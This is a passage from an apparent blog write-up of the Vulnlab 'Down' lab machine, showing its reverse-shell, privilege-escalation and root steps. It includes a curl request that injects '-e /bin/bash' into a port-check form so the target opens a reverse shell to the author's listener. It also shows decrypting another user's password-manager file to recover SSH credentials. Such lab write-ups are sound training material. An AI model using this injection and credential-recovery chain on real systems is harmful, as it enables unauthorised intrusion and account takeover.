+<h3 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/vulnlab/easy/Down~10.10.120.182$ curl -X <span class="string">&#x27;POST&#x27;</span> <span class="string">&quot;http://<span class="variable">$ip</span>/index.php?expertmode=tcp&quot;</span> -d <span class="string">&quot;ip=10.8.5.50&amp;port=9999&quot;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;<span class="built_in">head</span>&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Is it down or just me?&lt;/title&gt;</span><br><span class="line">    &lt;<span class="built_in">link</span> rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;style.css&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">    &lt;header&gt;</span><br><span class="line">        &lt;img src=<span class="string">&quot;/logo.png&quot;</span> alt=<span class="string">&quot;Logo&quot;</span>&gt;</span><br><span class="line">        &lt;h2&gt;Is it down or just me?&lt;/h2&gt;</span><br><span class="line">    &lt;/header&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class=<span class="string">&quot;container&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;Is the port refused, or is it just you?&lt;/h1&gt;</span><br><span class="line">        &lt;form <span class="built_in">id</span>=<span class="string">&quot;urlForm&quot;</span> action=<span class="string">&quot;index.php?expertmode=tcp&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">            &lt;input <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;url&quot;</span> name=<span class="string">&quot;ip&quot;</span> placeholder=<span class="string">&quot;Please enter an IP.&quot;</span> required&gt;&lt;br&gt;</span><br><span class="line">            &lt;input <span class="built_in">type</span>=<span class="string">&quot;number&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;port&quot;</span> name=<span class="string">&quot;port&quot;</span> placeholder=<span class="string">&quot;Please enter a port number.&quot;</span> required&gt;&lt;br&gt;</span><br><span class="line">            &lt;button <span class="built_in">type</span>=<span class="string">&quot;submit&quot;</span>&gt;Is it refused?&lt;/button&gt;</span><br><span class="line">        &lt;/form&gt;&lt;div class=<span class="string">&quot;output&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;outputSection&quot;</span>&gt;&lt;font size=+1&gt;It is up. It<span class="string">&#x27;s just you! 😝&lt;/font&gt;&lt;br&gt;&lt;br&gt;&lt;p id=&quot;outputDetails&quot;&gt;&lt;pre&gt;10.8.5.50: inverse host lookup failed: Unknown host</span></span><br><span class="line"><span class="string">(UNKNOWN) [10.8.5.50] 9999 (?) open&lt;/pre&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;footer&gt;© 2024 isitdownorjustme LLC&lt;/footer&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                    ----------------------------- listener -----------------------------</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">muyi@mag3:~/Desktop/vulnlab/easy/Down~10.10.120.182$ penelope 9999 -i tun0</span></span><br><span class="line"><span class="string">[+] Listening for reverse shells on 10.8.5.50:9999</span></span><br><span class="line"><span class="string">➤  💀 Show Payloads (p) 🏠 Main Menu (m) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)</span></span><br><span class="line"><span class="string">[-] Invalid shell from 10.10.120.182 🙄</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure></div>
+<p>from here, I found out that the expertmode is just using TCP to test the status, once connected, it closes the connection. Therefore, try to expand the command to establish a shell.</p>
+<p>After trying a few commands, this are the one working:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/vulnlab/easy/Down~10.10.120.182$ curl -X <span class="string">&#x27;POST&#x27;</span> <span class="string">&quot;http://<span class="variable">$ip</span>/index.php?expertmode=tcp&quot;</span> -d <span class="string">&quot;ip=10.8.5.50&amp;port=9999+-e+/bin/bash&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                    ----------------------------- listener -----------------------------</span><br><span class="line">                    </span><br><span class="line">muyi@mag3:~/Desktop/vulnlab/easy/Down~10.10.120.182$ penelope 9999 -i tun0</span><br><span class="line">[+] Listening <span class="keyword">for</span> reverse shells on 10.8.5.50:9999</span><br><span class="line">➤  💀 Show Payloads (p) 🏠 Main Menu (m) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)</span><br><span class="line">[-] Invalid shell from 10.10.120.182 🙄</span><br><span class="line">[-] Invalid shell from 10.10.120.182 🙄</span><br><span class="line">[-] Invalid shell from 10.10.120.182 🙄</span><br><span class="line">[+] Got reverse shell from 🐧 10.10.120.182 😍️ - Assigned SessionID &lt;4&gt;</span><br><span class="line">[+] Attempting to upgrade shell to PTY...</span><br><span class="line">[+] Shell upgraded successfully using /usr/bin/python3! 💪</span><br><span class="line">[+] Interacting with session [4], Shell Type: PTY, Menu key: F12</span><br><span class="line">[+] Logging to /home/muyi/.penelope/10.10.120.182/10.10.120.182.<span class="built_in">log</span> 📜</span><br><span class="line">www-data@down:/var/www/html$ <span class="built_in">ls</span></span><br><span class="line">index.php  logo.png  style.css  user_aeT1xa.txt</span><br><span class="line">www-data@down:/var/www/html$ <span class="built_in">cat</span> user_aeT1xa.txt</span><br><span class="line">VL&#123;********&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><h3 id="pswm"><a href="#pswm" class="headerlink" title="pswm"></a>pswm</h3><p>Again, after enumerating for a while, notice that www-data for some reason, can access the directory of user <code>aleks</code> and found some interesting things.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">www-data@down:/home$ <span class="built_in">cd</span> aleks</span><br><span class="line">www-data@down:/home/aleks$ <span class="built_in">ls</span> -la</span><br><span class="line">total 32</span><br><span class="line">drwxr-xr-x 5 aleks aleks 4096 Sep 15 09:15 .</span><br><span class="line">drwxr-xr-x 3 root  root  4096 Sep 13 14:43 ..</span><br><span class="line">lrwxrwxrwx 1 aleks aleks    9 Sep  6 14:43 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 aleks aleks  220 Jan  6  2022 .bash_logout</span><br><span class="line">-rw-r--r-- 1 aleks aleks 3771 Jan  6  2022 .bashrc</span><br><span class="line">drwx------ 2 aleks aleks 4096 Sep  6 15:03 .cache</span><br><span class="line">drwxrwxr-x 3 aleks aleks 4096 Sep  6 14:45 .<span class="built_in">local</span></span><br><span class="line">-rw-r--r-- 1 aleks aleks  807 Jan  6  2022 .profile</span><br><span class="line">drwx------ 2 aleks aleks 4096 Sep  6 14:42 .ssh</span><br><span class="line">-rw-r--r-- 1 aleks aleks    0 Sep 15 09:15 .sudo_as_admin_successful</span><br><span class="line"></span><br><span class="line">www-data@down:/home/aleks$ <span class="built_in">cd</span> .<span class="built_in">local</span></span><br><span class="line">www-data@down:/home/aleks/.local$ <span class="built_in">cd</span> share</span><br><span class="line">www-data@down:/home/aleks/.local/share$ <span class="built_in">cd</span> pswm/</span><br><span class="line"></span><br><span class="line">www-data@down:/home/aleks/.local/share/pswm$ file pswm</span><br><span class="line">pswm: ASCII text, with no line terminators</span><br><span class="line"></span><br><span class="line">www-data@down:/home/aleks/.local/share/pswm$ <span class="built_in">cat</span> pswm</span><br><span class="line">e9laWoKiJ0OdwK05b3hG7xMD+uIBBwl/v01lBRD+pntORa6Z/Xu/TdN3aG/ksAA0Sz55/kLggw==*xHnWpIqBWc25rrHFGPzyTg==*4Nt/05WUbySGyvDgSlpoUw==*u65Jfe0ml9BFaKEviDCHBQ==www-data</span><br></pre></td></tr></table></figure></div>
+
+<p>so what is pswm? It’s a simple password manager written in Python by referring to this <code>https://github.com/Julynx/pswm</code></p>
+<p>Using the decrypt tool from [<a class="link"   target="_blank" rel="noopener" href="https://github.com/repo4Chu/pswm-decoder/blob/main/pswm-decoder.py]" >https://github.com/repo4Chu/pswm-decoder/blob/main/pswm-decoder.py]<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>, make some modification to the file path of pswm and run it.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><figcaption><span>pswm-decoder.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(.venv) muyi@mag3:~/Desktop/vulnlab/easy/Down~10.10.120.182$ python3 pswm-decryptor.py</span><br><span class="line">Password: flower</span><br><span class="line">Decoded text:</span><br><span class="line">pswm    aleks   flower</span><br><span class="line">aleks@down      aleks   1uY3w22uc-Wr&#123;xNHR~+E</span><br></pre></td></tr></table></figure></div>
+<h2 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h2><p>Using the cracked credentials, I can logged into <code>aleks</code>, which allows all privilege so I can escalate my privilege to root.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">(.venv) muyi@mag3:~/Desktop/vulnlab/easy/Down~10.10.120.182$ ssh aleks@<span class="variable">$ip</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;10.10.120.182 (10.10.120.182)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:uq3+WwrPajXEUJC3CCuYMMlFTVM8CGYqMtGB9mI29wg.</span></span><br><span class="line"><span class="string">This key is not known by any other names.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>10.10.120.182<span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">aleks@10.10.120.182&#x27;</span>s password:</span><br><span class="line">Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-119-generic x86_64)</span><br><span class="line">Last login: Sun Sep 15 09:14:52 2024 from 10.8.0.101</span><br><span class="line">aleks@down:~$ <span class="built_in">whoami</span></span><br><span class="line">aleks</span><br><span class="line"></span><br><span class="line">aleks@down:~$ <span class="built_in">sudo</span> -l</span><br><span class="line">[<span class="built_in">sudo</span>] password <span class="keyword">for</span> aleks:</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> aleks on down:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">User aleks may run the following commands on down:</span><br><span class="line">    (ALL : ALL) ALL</span><br><span class="line"></span><br><span class="line">aleks@down:~$ <span class="built_in">sudo</span> su</span><br><span class="line">root@down:/home/aleks# <span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line"></span><br><span class="line">root@down:/home/aleks# <span class="built_in">cd</span></span><br><span class="line">root@down:~# <span class="built_in">cat</span> root.txt</span><br><span class="line">VL&#123;********&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/vulnlab-down/down-pwn.png"
+                      alt="pwn"
+                ></p>
+
+		</div>
+
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Linux/">#Linux</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Vulnlab/">#Vulnlab</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Easy/">#Easy</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2025/01/28/Vulnlab/Vulnlab-Escape/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">Vulnlab-Escape</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/01/28/Vulnlab/Vulnlab-Data/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">Vulnlab-Data</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">Vulnlab-Down</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#User"><span class="nav-text">User</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Enumeration"><span class="nav-text">Enumeration</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exploitation"><span class="nav-text">Exploitation</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reverse-Shell"><span class="nav-text">Reverse Shell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privilege-Escalation"><span class="nav-text">Privilege Escalation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#pswm"><span class="nav-text">pswm</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Root"><span class="nav-text">Root</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2025</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-regular fa-computer-classic"></i>&nbsp;&nbsp;<a href="/">Muyi</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        37 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
+        </div>
+        
+        
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog "></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
+</div>
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
